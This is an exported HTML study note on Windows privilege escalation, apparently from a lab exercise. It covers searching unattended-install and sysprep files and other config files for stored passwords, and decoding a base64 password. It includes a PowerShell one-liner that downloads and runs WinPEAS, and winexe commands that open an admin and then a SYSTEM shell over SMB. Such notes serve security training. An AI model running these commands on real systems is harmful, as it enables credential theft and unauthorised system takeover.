<!doctype html>
<html>

<head>
  <meta http-equiv="content-type" content="text/html; charset=utf-8">
  <title>manually</title>
  <meta name="generator" content="CherryTree">
  <link rel="stylesheet" href="res/styles3.css" type="text/css" />
</head>

<body>
  <div class='page'>
    <h1 class='title'>manually</h1><br /><br />Unattended files are most likely found in one of the following
    directories:<br /> ◇ C:\Windows\Panther\<br /> ◇ C:\Windows\Panther\Unattend\<br /> ◇ C:\Windows\System32\<br /> ◇
    C:\Windows\System32\sysprep\<br />Search the directories for the following files:<br /> → Unattend.xml<br /> →
    Unattended.xml<br /> → Unattend.txt<br /> → sysprep.xml<br /> → sysprep.inf<br /> → autounattend.txt<br /> →
    autounattend.xml<br /> → Groups.xml<br /><br /><strong>Search with WinPEAS</strong>: <a
      href="https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/raw/master/winPEAS/winPEASexe/binaries/Release/winPEASany.exe" target="_blank">https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/raw/master/winPEAS/winPEASexe/binaries/Release/winPEASany.exe</a><br />
    <div class="codebox">
      <div class="codebox">
        PS&gt;&nbsp;(new-object&nbsp;System.Net.WebClient).DownloadFile(&quot;https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/raw/master/winPEAS/winPEASexe/binaries/Release/winPEASany.exe&quot;,&nbsp;&quot;$env:userprofile\desktop\winPEASany.exe&quot;);Invoke-Expression&nbsp;&quot;$env:userprofile\desktop\winPEASany.exe&nbsp;quiet&nbsp;cmd&nbsp;filesinfo&quot;;Remove-Item&nbsp;-Path&nbsp;&quot;$env:userprofile\desktop\winPEASany.exe&quot;;
      </div>
    </div> <br /> <a href=""><img src="images/935-1.png" alt="images/935-1.png" /></a><br /> If we look in the source
    code of WinPEAS, the list of file name patterns it searches for, is quite long... Sometime anyway is easier to
    search for files<br /> <br /><strong>Search for Unattended Installs</strong><br />To search these files we can use
    the cmdlet Get-ChildItem(gci)<br />• powershell: search only in the folders more promising<br />
    <div class="codebox">
      <div class="codebox">
        PS&gt;&nbsp;gci&nbsp;-Path&nbsp;C:\Windows\Panther,C:\Windows\Panther\Unattend,C:\Windows\System32,C:\Windows\System32\sysprep&nbsp;-Include&nbsp;*sysprep.inf,*sysprep.xml,*sysprep.txt,*unattended.xml,*unattend.xml,*unattend.txt&nbsp;-File&nbsp;-Recurse&nbsp;-EA&nbsp;SilentlyContinue
      </div>
    </div><br /> <a href=""><img src="images/935-2.png" alt="images/935-2.png" /></a><br />• powershell: search in all
    the C:\ drive<br />
    <div class="codebox">
      <div class="codebox">
        PS&gt;&nbsp;gci&nbsp;-Path&nbsp;C:\&nbsp;-Include&nbsp;*sysprep.inf,*sysprep.xml,*sysprep.txt,*unattended.xml,*unattend.xml,*unattend.txt,*autounattend.txt,*autounattend.xml,*Groups.xml&nbsp;-File&nbsp;-Recurse&nbsp;-EA&nbsp;SilentlyContinue
      </div>
    </div><br /> <span style="text-decoration:underline;">Note</span>: Passwords in these files may be base64
    encoded<br /> <a href=""><img src="images/935-3.png" alt="images/935-3.png" /></a><br /><br /><strong>Search for
      general Configuration files</strong><br />The following commands are not advised to be run in the root directory.
    It is better run them in directories that we might think are important, such:<br /> ◇ current user home directory
    (cd %userprofile%)<br /> ◇ temporary directory (cd %temp%)<br /> ◇ directory of a suspicious program<br /> ◇
    ...<br />• search for files with “pass” in the name, or ending in “.config”<br />
    <div class="codebox">
      <div class="codebox">
        C:\&gt;&nbsp;cd&nbsp;%userprofile%&nbsp;&amp;&nbsp;dir&nbsp;/s&nbsp;*pass*&nbsp;==&nbsp;*.config&nbsp;&amp;&nbsp;cd&nbsp;%temp%&nbsp;&amp;&nbsp;dir&nbsp;/s&nbsp;*pass*&nbsp;==&nbsp;*.config
      </div>
    </div><br />• Recursively search that contain the word “password” and also end in either .xml, .ini or .txt:<br />
    <div class="codebox">
      <div class="codebox">
        C:\&gt;&nbsp;cd&nbsp;%userprofile%&nbsp;&amp;&nbsp;findstr&nbsp;/si&nbsp;password&nbsp;*.xml&nbsp;*.ini&nbsp;*.txt&nbsp;&amp;&nbsp;cd&nbsp;%temp%&nbsp;&amp;&nbsp;findstr&nbsp;/si&nbsp;password&nbsp;*.xml&nbsp;*.ini&nbsp;*.txt
      </div>
    </div>
    <br /><br /><br />------------------------------------------------------------------------------------------------------------------<br /><strong>Print
      content of a file</strong><br />
    <div class="codebox">
      <div class="codebox">C:\&gt;&nbsp;type&nbsp;<span style="color:#000000;font-weight:400">&lt;</span>file<span
          style="color:#000000;font-weight:400">&gt;</span></div>
    </div><br /> <a href=""><img src="images/935-4.png" alt="images/935-4.png" /></a><br /><strong>Decode
      base64</strong><br />
    <div class="codebox">
      <div class="codebox">root@kali:/#&nbsp;echo&nbsp;&quot;cGFzc3dvcmQxMjM=&quot;&nbsp;|&nbsp;base64&nbsp;-d</div>
    </div><br /> <a href=""><img src="images/935-5.png" alt="images/935-5.png" /></a><br /><strong>Winexe: spawn a shell
      with credentials via SMB(port 445)</strong><br />winexe command to spawn a shell using these credentials:<br />
    <div class="codebox">
      <div class="codebox">
        root@kali:/#&nbsp;winexe&nbsp;-U&nbsp;&#39;admin%password123&#39;&nbsp;//192.168.147.210&nbsp;cmd.exe<br />C:\&gt;&nbsp;net&nbsp;localgroup&nbsp;administrators&nbsp;&nbsp;&nbsp;&nbsp;#to&nbsp;check&nbsp;if&nbsp;the&nbsp;user&nbsp;is&nbsp;a&nbsp;local&nbsp;administrator
      </div>
    </div><br /> <a href=""><img src="images/935-6.png" alt="images/935-6.png" /></a><br /> since this user is an an
    admin, we can also have a SYSTEM shell with these credentials<br />
    <div class="codebox">
      <div class="codebox">
        root@kali:/#&nbsp;winexe&nbsp;-U&nbsp;&#39;admin%password123&#39;&nbsp;--system&nbsp;//192.168.147.210&nbsp;cmd.exe
      </div>
    </div><br /> <a href=""><img src="images/935-7.png" alt="images/935-7.png" /></a><br /><br /><br />
  </div>
</body>

</html>